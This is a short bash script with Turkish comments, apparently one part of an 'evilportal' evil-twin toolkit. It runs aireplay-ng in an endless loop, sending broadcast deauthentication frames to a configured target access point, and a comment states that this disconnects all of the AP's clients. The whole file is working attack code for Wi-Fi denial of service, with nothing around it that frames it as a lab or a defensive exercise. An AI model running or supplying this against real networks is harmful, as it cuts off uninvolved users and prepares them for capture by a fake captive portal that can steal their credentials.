#!/usr/bin/env bash
# ==============================================================
#  evilportal — hedef AP'ye sürekli deauth
#  Kullanım: sudo ./deauth.sh [monitor_iface]
# ==============================================================
set -uo pipefail

BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$BASE/config.sh"

MON_IF="${1:-$MON_IF}"

[[ $EUID -eq 0 ]] || { echo "root gerekli"; exit 1; }
command -v aireplay-ng >/dev/null || { echo "aireplay-ng yok"; exit 1; }

iw dev "$MON_IF" set channel "$CHANNEL" 2>/dev/null

echo "[*] deauth → $TARGET_BSSID  ($MON_IF, ch $CHANNEL)"

while :; do
  # Broadcast deauth: AP'nin tüm istemcilerini düşürür
  aireplay-ng --deauth 10 -a "$TARGET_BSSID" "$MON_IF" >/dev/null 2>&1
  sleep 1
done
